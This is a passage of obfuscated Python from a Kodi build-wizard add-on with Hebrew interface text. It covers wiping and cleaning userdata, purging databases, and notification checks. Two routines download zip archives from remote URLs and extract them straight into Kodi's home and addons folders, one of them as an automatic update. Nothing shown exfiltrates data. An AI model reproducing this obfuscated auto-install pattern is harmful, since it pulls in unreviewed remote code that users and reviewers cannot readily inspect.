				elif OOO0OO00O0O000000 =='b-mvzyqh-b.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4701
				elif OOO0OO00O0O000000 =='mainmenu.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4702
				elif OOO0OO00O0O000000 =='skin.Premium.mod.properties'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4703
				elif OOO0OO00O0O000000 =='favourites.xml'and O0OO000O000O00OOO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4707
				elif OOO0OO00O0O000000 =='guisettings.xml'and O0OO000O000O00OOO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4709
				elif OOO0OO00O0O000000 =='profiles.xml'and O0OO000O000O00OOO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4710
				elif OOO0OO00O0O000000 =='advancedsettings.xml'and O0OO000O000O00OOO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4711
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4712
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'program.apollo'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4713
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4714
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'plugin.video.elementum'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4717
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4718
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4719
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'plugin.video.quasar'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4721
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'program.apollo'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4722
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4723
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4724
				elif OOO0OO00O0O000000 in LOGFILES :wiz .log ("Keep Log File: %s"%OOO0OO00O0O000000 ,xbmc .LOGNOTICE )#line:4725
				elif OOO0OO00O0O000000 .endswith ('.db'):#line:4726
					try :#line:4727
						if OOO0OO00O0O000000 ==OO000OOOOOO000000 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOO0OO00O0O000000 ,KODIV ),xbmc .LOGNOTICE )#line:4728
						else :os .remove (os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ))#line:4729
					except Exception as O00OOOO00OO000OOO :#line:4730
						if not OOO0OO00O0O000000 .startswith ('Textures13'):#line:4731
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4732
							wiz .log ("-> %s"%(str (O00OOOO00OO000OOO )),xbmc .LOGNOTICE )#line:4733
							wiz .purgeDb (os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ))#line:4734
				else :#line:4735
					DP .update (int (wiz .percentage (OO00000O000O000OO ,OO0O0OOOO0000O0O0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO00O0O000000 ),'')#line:4736
					try :os .remove (os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ))#line:4737
					except Exception as O00OOOO00OO000OOO :#line:4738
						wiz .log ("Error removing %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4739
						wiz .log ("-> / %s"%(str (O00OOOO00OO000OOO )),xbmc .LOGNOTICE )#line:4740
			if DP .iscanceled ():#line:4741
				DP .close ()#line:4742
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4743
				return False #line:4744
		for O00O0OOO0O0000O0O ,O0O0O0OOOO0OO000O ,OO0O000OO0OO00OOO in os .walk (OOO0OOOO00O0O0OOO ,topdown =True ):#line:4745
			O0O0O0OOOO0OO000O [:]=[OO000O0OO0O00OO0O for OO000O0OO0O00OO0O in O0O0O0OOOO0OO000O if OO000O0OO0O00OO0O not in EXCLUDES ]#line:4746
			for OOO0OO00O0O000000 in O0O0O0OOOO0OO000O :#line:4747
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OO00O0O000000 ),'')#line:4748
			  if OOO0OO00O0O000000 not in ["Database","userdata","temp","addons","addon_data"]:#line:4749
			   if not (OOO0OO00O0O000000 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4750
			    if not (OOO0OO00O0O000000 =='skin.titan'and KEEPSKIN3 =='true'):#line:4752
			      if not (OOO0OO00O0O000000 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4753
			       if not (OOO0OO00O0O000000 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4754
			        if not (OOO0OO00O0O000000 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4755
			         if not (OOO0OO00O0O000000 =='program.apollo'and KEEPINFO =='true'):#line:4756
			          if not (OOO0OO00O0O000000 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4757
			            if not (OOO0OO00O0O000000 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4759
			             if not (OOO0OO00O0O000000 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4760
			              if not (OOO0OO00O0O000000 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4761
			               if not (OOO0OO00O0O000000 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4762
			                if not (OOO0OO00O0O000000 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4763
			                 if not (OOO0OO00O0O000000 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4764
			                  if not (OOO0OO00O0O000000 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4765
			                   if not (OOO0OO00O0O000000 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4766
			                    if not (OOO0OO00O0O000000 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4767
			                     if not (OOO0OO00O0O000000 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4768
			                       if not (OOO0OO00O0O000000 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4770
			                           if not (OOO0OO00O0O000000 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4774
			                            if not (OOO0OO00O0O000000 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4775
			                             if not (OOO0OO00O0O000000 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4776
			                              if not (OOO0OO00O0O000000 =='plugin.video.quasar'and KEEPINFO =='true'):#line:4777
			                               if not (OOO0OO00O0O000000 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4778
			                                  shutil .rmtree (os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),ignore_errors =True ,onerror =None )#line:4780
			if DP .iscanceled ():#line:4781
				DP .close ()#line:4782
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4783
				return False #line:4784
		DP .close ()#line:4785
		wiz .clearS ('build')#line:4786
		if over ==True :#line:4787
			return True #line:4788
		elif install =='restore':#line:4789
			return True #line:4790
		elif install :#line:4791
			buildWizard (install ,'normal',over =True )#line:4792
		else :#line:4793
			if INSTALLMETHOD ==1 :O0OO00O00OO00O00O =1 #line:4794
			elif INSTALLMETHOD ==2 :O0OO00O00OO00O00O =0 #line:4795
			else :O0OO00O00OO00O00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4796
			if O0OO00O00OO00O00O ==1 :wiz .reloadFix ('fresh')#line:4797
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4798
	else :#line:4799
		if not install =='restore':#line:4800
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4801
			wiz .refresh ()#line:4802
def clearCache ():#line:4807
		wiz .clearCache ()#line:4808
def fixwizard ():#line:4812
		wiz .fixwizard ()#line:4813
def totalClean ():#line:4815
		wiz .clearCache ()#line:4817
		wiz .clearPackages ('total')#line:4818
		clearThumb ('total')#line:4819
		cleanfornewbuild ()#line:4820
def cleanfornewbuild ():#line:4821
		try :#line:4822
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4823
		except :#line:4824
			pass #line:4825
		try :#line:4826
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4827
		except :#line:4828
			pass #line:4829
		try :#line:4830
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4831
		except :#line:4832
			pass #line:4833
def clearThumb (type =None ):#line:4834
	OOO0OOOO00000OOO0 =wiz .latestDB ('Textures')#line:4835
	if not type ==None :OOO0OO0O0O000000O =1 #line:4836
	else :OOO0OO0O0O000000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOO0OOOO00000OOO0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4837
	if OOO0OO0O0O000000O ==1 :#line:4838
		try :wiz .removeFile (os .join (DATABASE ,OOO0OOOO00000OOO0 ))#line:4839
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOO0OOOO00000OOO0 )#line:4840
		wiz .removeFolder (THUMBS )#line:4841
	else :wiz .log ('Clear thumbnames cancelled')#line:4843
	wiz .redoThumbs ()#line:4844
def purgeDb ():#line:4846
	O00OO00000O0OO0O0 =[];O000OOOOO00OOOOOO =[]#line:4847
	for OO0O00OOO0O00000O ,O000OO00000000OO0 ,O000O0O00OOOO00OO in os .walk (HOME ):#line:4848
		for OO00O0OOOOO0O000O in fnmatch .filter (O000O0O00OOOO00OO ,'*.db'):#line:4849
			if OO00O0OOOOO0O000O !='Thumbs.db':#line:4850
				O00OO00OOO00O0OOO =os .path .join (OO0O00OOO0O00000O ,OO00O0OOOOO0O000O )#line:4851
				O00OO00000O0OO0O0 .append (O00OO00OOO00O0OOO )#line:4852
				OOOO00OO000O00O00 =O00OO00OOO00O0OOO .replace ('\\','/').split ('/')#line:4853
				O000OOOOO00OOOOOO .append ('(%s) %s'%(OOOO00OO000O00O00 [len (OOOO00OO000O00O00 )-2 ],OOOO00OO000O00O00 [len (OOOO00OO000O00O00 )-1 ]))#line:4854
	if KODIV >=16 :#line:4855
		OO0O0OOOOO0O0O0O0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000OOOOO00OOOOOO )#line:4856
		if OO0O0OOOOO0O0O0O0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4857
		elif len (OO0O0OOOOO0O0O0O0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4858
		else :#line:4859
			for O00OOO0O0O0O00000 in OO0O0OOOOO0O0O0O0 :wiz .purgeDb (O00OO00000O0OO0O0 [O00OOO0O0O0O00000 ])#line:4860
	else :#line:4861
		OO0O0OOOOO0O0O0O0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000OOOOO00OOOOOO )#line:4862
		if OO0O0OOOOO0O0O0O0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4863
		else :wiz .purgeDb (O00OO00000O0OO0O0 [O00OOO0O0O0O00000 ])#line:4864
def fastupdatefirstbuild (OOO00OO000000OO00 ):#line:4870
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:4871
	if ENABLE =='Yes':#line:4872
		if not NOTIFY =='true':#line:4873
			OOO0OO0O000O0O00O =wiz .workingURL (NOTIFICATION )#line:4874
			if OOO0OO0O000O0O00O ==True :#line:4875
				O0O00OO00O00OOOO0 ,O000OOO0O0000OO00 =wiz .splitNotify (NOTIFICATION )#line:4876
				if not O0O00OO00O00OOOO0 ==False :#line:4878
					try :#line:4879
						O0O00OO00O00OOOO0 =int (O0O00OO00O00OOOO0 );OOO00OO000000OO00 =int (OOO00OO000000OO00 )#line:4880
						checkidupdate ()#line:4881
						wiz .setS ("notedismiss","true")#line:4882
						if O0O00OO00O00OOOO0 ==OOO00OO000000OO00 :#line:4883
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0O00OO00O00OOOO0 ),xbmc .LOGNOTICE )#line:4884
						elif O0O00OO00O00OOOO0 >OOO00OO000000OO00 :#line:4886
							wiz .log ("[Notifications] id: %s"%str (O0O00OO00O00OOOO0 ),xbmc .LOGNOTICE )#line:4887
							wiz .setS ('noteid',str (O0O00OO00O00OOOO0 ))#line:4888
							wiz .setS ("notedismiss","true")#line:4889
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4892
					except Exception as O00O0O0OO0OOOOOOO :#line:4893
						wiz .log ("Error on Notifications Window: %s"%str (O00O0O0OO0OOOOOOO ),xbmc .LOGERROR )#line:4894
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4896
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOO0OO0O000O0O00O ),xbmc .LOGNOTICE )#line:4897
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4898
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4899
def checkidupdate ():#line:4905
				wiz .setS ("notedismiss","true")#line:4907
				OO0OOO0O000OO00OO =wiz .workingURL (NOTIFICATION )#line:4908
				O0OOO0O00000O00O0 =" Kodi Premium"#line:4910
				O00O0OOO0OO000O0O =wiz .checkBuild (O0OOO0O00000O00O0 ,'gui')#line:4911
				O0OOO0O0OO0OOOO0O =O0OOO0O00000O00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4912
				if not wiz .workingURL (O00O0OOO0OO000O0O )==True :return #line:4913
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4914
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OOO0O00000O00O0 ),'','אנא המתן')#line:4915
				O0OO00000000000O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOO0O0OO0OOOO0O )#line:4916
				try :os .remove (O0OO00000000000O0 )#line:4917
				except :pass #line:4918
				logging .warning (O00O0OOO0OO000O0O )#line:4919
				if 'google'in O00O0OOO0OO000O0O :#line:4920
				   OOO0OO00OO00O000O =googledrive_download (O00O0OOO0OO000O0O ,O0OO00000000000O0 ,DP ,wiz .checkBuild (O0OOO0O00000O00O0 ,'filesize'))#line:4921
				else :#line:4924
				  downloader .download (O00O0OOO0OO000O0O ,O0OO00000000000O0 ,DP )#line:4925
				xbmc .sleep (100 )#line:4926
				O00OO00O0O0OOO00O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO0O00000O00O0 )#line:4927
				DP .update (0 ,O00OO00O0O0OOO00O ,'','אנא המתן')#line:4928
				extract .all (O0OO00000000000O0 ,HOME ,DP ,title =O00OO00O0O0OOO00O )#line:4929
				DP .close ()#line:4930
				wiz .defaultSkin ()#line:4931
				wiz .lookandFeelData ('save')#line:4932
				if KODIV >=18 :#line:4933
					skindialogsettind18 ()#line:4934
				if INSTALLMETHOD ==1 :OO0O00000OO000O00 =1 #line:4937
				elif INSTALLMETHOD ==2 :OO0O00000OO000O00 =0 #line:4938
				else :DP .close ()#line:4939
def gaiaserenaddon ():#line:4941
  OO0OOO000OO0O0OO0 =(ADDON .getSetting ("gaiaseren"))#line:4942
  O0O00OOO0OOO0OO00 =(ADDON .getSetting ("rdbuild"))#line:4943
  if OO0OOO000OO0O0OO0 =='true'and O0O00OOO0OOO0OO00 =='true':#line:4944
    O0O00O000OO00000O =(NEWFASTUPDATE )#line:4945
    O0O0OO0O0OOOOOO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4946
    OOOOOO00O0OOO0000 =xbmcgui .DialogProgress ()#line:4947
    OOOOOO00O0OOO0000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4948
    OO0OO0O000O0O00O0 =os .path .join (PACKAGES ,'isr.zip')#line:4949
    OO0O0OOOOOO000000 =urllib2 .Request (O0O00O000OO00000O )#line:4950
    OO0O00O00O00O0O0O =urllib2 .urlopen (OO0O0OOOOOO000000 )#line:4951
    OO000O0000000O000 =xbmcgui .DialogProgress ()#line:4953
    OO000O0000000O000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4954
    OO000O0000000O000 .update (0 )#line:4955
    O0O00O0000O0O0000 =open (OO0OO0O000O0O00O0 ,'wb')#line:4957
    try :#line:4959
      OOO000O0O0000O00O =OO0O00O00O00O0O0O .info ().getheader ('Content-Length').strip ()#line:4960
      OOO0OOOO0O00OO000 =True #line:4961
    except AttributeError :#line:4962
          OOO0OOOO0O00OO000 =False #line:4963
    if OOO0OOOO0O00OO000 :#line:4965
          OOO000O0O0000O00O =int (OOO000O0O0000O00O )#line:4966
    OO0OO0000OO00OO00 =0 #line:4968
    OO0O00O0O00OOOO0O =time .time ()#line:4969
    while True :#line:4970
          OO000OOOOO00OO00O =OO0O00O00O00O0O0O .read (8192 )#line:4971
          if not OO000OOOOO00OO00O :#line:4972
              sys .stdout .write ('\n')#line:4973
              break #line:4974
          OO0OO0000OO00OO00 +=len (OO000OOOOO00OO00O )#line:4976
          O0O00O0000O0O0000 .write (OO000OOOOO00OO00O )#line:4977
          if not OOO0OOOO0O00OO000 :#line:4979
              OOO000O0O0000O00O =OO0OO0000OO00OO00 #line:4980
          if OO000O0000000O000 .iscanceled ():#line:4981
             OO000O0000000O000 .close ()#line:4982
             try :#line:4983
              os .remove (OO0OO0O000O0O00O0 )#line:4984
             except :#line:4985
              pass #line:4986
             break #line:4987
          OO00OOO0O00000O0O =float (OO0OO0000OO00OO00 )/OOO000O0O0000O00O #line:4988
          OO00OOO0O00000O0O =round (OO00OOO0O00000O0O *100 ,2 )#line:4989
          OO0000OOO00OO0O00 =OO0OO0000OO00OO00 /(1024 *1024 )#line:4990
          OO0OOOO0O00OO00O0 =OOO000O0O0000O00O /(1024 *1024 )#line:4991
          OOO0O00OOO0OOO00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0000OOO00OO0O00 ,'teal',OO0OOOO0O00OO00O0 )#line:4992
          if (time .time ()-OO0O00O0O00OOOO0O )>0 :#line:4993
            OOOO0OO00O00O0O00 =OO0OO0000OO00OO00 /(time .time ()-OO0O00O0O00OOOO0O )#line:4994
            OOOO0OO00O00O0O00 =OOOO0OO00O00O0O00 /1024 #line:4995
          else :#line:4996
           OOOO0OO00O00O0O00 =0 #line:4997
          O00000O0OO0O0OOOO ='KB'#line:4998
          if OOOO0OO00O00O0O00 >=1024 :#line:4999
             OOOO0OO00O00O0O00 =OOOO0OO00O00O0O00 /1024 #line:5000
             O00000O0OO0O0OOOO ='MB'#line:5001
          if OOOO0OO00O00O0O00 >0 and not OO00OOO0O00000O0O ==100 :#line:5002
              OO0O00O0O0O0O000O =(OOO000O0O0000O00O -OO0OO0000OO00OO00 )/OOOO0OO00O00O0O00 #line:5003
          else :#line:5004
              OO0O00O0O0O0O000O =0 #line:5005
          OO00OOO0O0OO000OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO0OO00O00O0O00 ,O00000O0OO0O0OOOO )#line:5006
          OO000O0000000O000 .update (int (OO00OOO0O00000O0O ),OOO0O00OOO0OOO00O ,OO00OOO0O0OO000OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5008
    OO00OO0OO0000OOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5011
    O0O00O0000O0O0000 .close ()#line:5014
    extract .all (OO0OO0O000O0O00O0 ,OO00OO0OO0000OOOO ,OO000O0000000O000 )#line:5015
    try :#line:5019
      os .remove (OO0OO0O000O0O00O0 )#line:5020
    except :#line:5021
      pass #line:5022
def testnotify ():#line:5024
	O0O0O0OOOOO00OO0O =wiz .workingURL (NOTIFICATION )#line:5025
	if O0O0O0OOOOO00OO0O ==True :#line:5026
		try :#line:5027
			OO0OO0O00O00OO0OO ,O0O0000OOOOO0O0O0 =wiz .splitNotify (NOTIFICATION )#line:5028
			if OO0OO0O00O00OO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5029
			if STARTP2 ()=='ok':#line:5030
				notify .notification (O0O0000OOOOO0O0O0 ,True )#line:5031
		except Exception as O0OOO0O00O0O0O00O :#line:5032
			wiz .log ("Error on Notifications Window: %s"%str (O0OOO0O00O0O0O00O ),xbmc .LOGERROR )#line:5033
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5034
def testnotify2 ():#line:5035
	O0000OO00OO00OO00 =wiz .workingURL (NOTIFICATION2 )#line:5036
	if O0000OO00OO00OO00 ==True :#line:5037
		try :#line:5038
			O000O00OOO0OO00OO ,OOO0000OO0OOO0OO0 =wiz .splitNotify (NOTIFICATION2 )#line:5039
			if O000O00OOO0OO00OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5040
			if STARTP2 ()=='ok':#line:5041
				notify .notification2 (OOO0000OO0OOO0OO0 ,True )#line:5042
		except Exception as O00OO0OOOO0O0O0O0 :#line:5043
			wiz .log ("Error on Notifications Window: %s"%str (O00OO0OOOO0O0O0O0 ),xbmc .LOGERROR )#line:5044
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5045
def testnotify3 ():#line:5046
	OO0OO0OOOOOOOOO00 =wiz .workingURL (NOTIFICATION3 )#line:5047
	if OO0OO0OOOOOOOOO00 ==True :#line:5048
		try :#line:5049
			OOOO0O00O00O0O000 ,O00OO00OO00OOO000 =wiz .splitNotify (NOTIFICATION3 )#line:5050
			if OOOO0O00O00O0O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5051
			if STARTP2 ()=='ok':#line:5052
				notify .notification3 (O00OO00OO00OOO000 ,True )#line:5053
		except Exception as O0O0O00000OO0OOO0 :#line:5054
			wiz .log ("Error on Notifications Window: %s"%str (O0O0O00000OO0OOO0 ),xbmc .LOGERROR )#line:5055
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5056
def servicemanual ():#line:5057
	OO0O0O0OOO0O0OO0O =wiz .workingURL (HELPINFO )#line:5058
